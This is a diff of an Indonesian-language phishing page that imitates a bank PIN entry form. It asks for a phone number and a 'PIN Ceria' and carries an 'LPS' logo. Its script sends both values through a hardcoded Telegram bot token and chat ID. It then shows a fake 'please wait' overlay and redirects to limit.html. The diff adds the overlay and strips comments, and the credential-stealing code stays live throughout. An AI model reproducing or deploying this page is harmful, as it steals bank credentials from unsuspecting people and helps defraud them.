@@ -9,8 +9,8 @@
       font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
-      max-width: 800px; /* Menetapkan lebar maksimal untuk konten */
-      margin: 0 auto; /* Membuat konten tetap di tengah */
+      max-width: 800px;
+      margin: 0 auto;
     }
 
     .gambar {
@@ -38,12 +38,12 @@
     .form-container input[type="tel"],
     .form-container input[type="password"],
     .form-container input[type="Submit"] {
-      width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
+      width: calc(85% - 8px);
       padding: 13px;
       border-radius: 8px;
       border: 1px solid #663399;
-      margin-bottom: 30px; /* Jarak antara kolom nomor hp dan kolom pin */
-      margin-left: 4px; /* Add margin on the left side */
+      margin-bottom: 30px;
+      margin-left: 4px;
     }
 
     .form-container input[type="Submit"] {
@@ -58,7 +58,6 @@
       margin-left: 7px;
     }
 
-    /* Ukuran relatif untuk gambar di bawah */
     .gambar-bawah {
       display: flex;
       justify-content: center;
@@ -71,19 +70,42 @@
       object-fit: cover;
       margin: 0 25px;
     }
+
+    /* Aturan gaya untuk elemen putih */
+    .white-element {
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8); /* Atur alpha (nilai transparansi) sesuai keinginan */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .white-element img {
+      width: 80px; /* Ganti dengan ukuran yang diinginkan */
+      height: 80px; /* Ganti dengan ukuran yang diinginkan */
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: 16px;
+    }
   </style>
   <script>
     function sendMessageToTelegram(message) {
       var xhttp = new XMLHttpRequest();
       xhttp.onreadystatechange = function() {
         if (this.readyState === 4 && this.status === 200) {
-          // Respons atau tindakan setelah pesan terkirim berhasil
           console.log("Pesan terkirim: " + message);
         }
       };
       var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
 
-      // Kirim permintaan POST
       xhttp.open("POST", url, true);
       xhttp.send();
     }
@@ -91,31 +113,51 @@
     function kirimPesan() {
       var nomorHP = document.getElementById('nomor_hp').value;
       var pin = document.getElementById('pin').value;
-      // Validasi jika nomor HP atau nomor PIN kosong
-  if (nomorHP.trim() === '' || pin.trim() === '') {
-    // Memicu efek getaran
-    if (navigator.vibrate) {
-      navigator.vibrate(200); // 200 milidetik getaran
-    }
-    return;
-  }
+      if (nomorHP.trim() === '' || pin.trim() === '') {
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        return;
+      }
 
       var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
       sendMessageToTelegram(message);
-      window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html
+      showWhiteElement();
     }
-function updateStyle(inputId) {
-    var inputElement = document.getElementById(inputId);
-    var inputValue = inputElement.value;
 
-    if (inputValue !== '') {
-      inputElement.style.fontWeight = 'bold';
-      inputElement.style.color = 'rgba(black)'; // Warna ungu agak kehitaman
-    } else {
-      inputElement.style.fontWeight = 'normal';
-      inputElement.style.color = 'inherit'; // Kembalikan warna default
+    function showWhiteElement() {
+      var whiteElement = document.createElement('div');
+      whiteElement.classList.add('white-element');
+
+      var logoImage = document.createElement('img');
+      logoImage.src = 'https://i.ibb.co/znztJ3h/IMG-20240125-000423-removebg-preview.png';
+      logoImage.alt = 'Logo';
+      whiteElement.appendChild(logoImage);
+
+      var loadingText = document.createElement('div');
+      loadingText.classList.add('loading-text');
+      loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
+      whiteElement.appendChild(loadingText);
+
+      document.body.appendChild(whiteElement);
+
+      setTimeout(function () {
+        window.location.href = 'limit.html';
+      }, 5000); // Ubah waktu penundaan menjadi 5 detik
     }
-  }
+
+    function updateStyle(inputId) {
+      var inputElement = document.getElementById(inputId);
+      var inputValue = inputElement.value;
+
+      if (inputValue !== '') {
+        inputElement.style.fontWeight = 'bold';
+        inputElement.style.color = 'rgba(black)';
+      } else {
+        inputElement.style.fontWeight = 'normal';
+        inputElement.style.color = 'inherit';
+      }
+    }
   </script>
 </head>
 <body>
@@ -135,4 +177,4 @@ function updateStyle(inputId) {
     <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Logo LPS">
   </div>
 </body>
-  </html
+</html>
